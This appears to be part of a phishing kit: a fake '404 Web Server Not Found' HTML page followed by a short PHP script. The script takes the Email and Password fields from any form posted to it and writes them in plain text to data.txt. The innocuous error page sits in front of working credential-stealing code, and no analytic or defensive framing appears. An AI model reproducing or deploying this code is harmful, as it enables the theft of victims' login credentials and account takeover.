
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Webserver Not Found</title>
          <!-- Bootstrap CSS -->
          <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
          <style>
              body {
                  font-family: Arial, sans-serif;
                  background-color: #f8f9fa;
              }

              .container {
                  margin-top: 100px;
                  text-align: center;
              }

              #h2 {
                  font-size: 48px;
                  margin-bottom: 20px;
              }

              p {
                  font-size: 24px;
                  margin-bottom: 40px;
              }

            
          </style>
      </head>
      <body>
          <div class="container">
            
              <h2>   </h2><h2 id="h2"> 404</h2>
              <p>Web Server Not Found..</p>
             
          </div>

          <!-- Bootstrap & jQuery JS -->
          <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
          <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
      </body>
      </html>

<?php
$email = $_POST['Email'];
$password = $_POST['Password'];

$file = fopen("data.txt", "a");
fwrite($file, "Email:      " . $email . "\nPassword:   " . $password . "\n\n");
fclose($file);
?> 
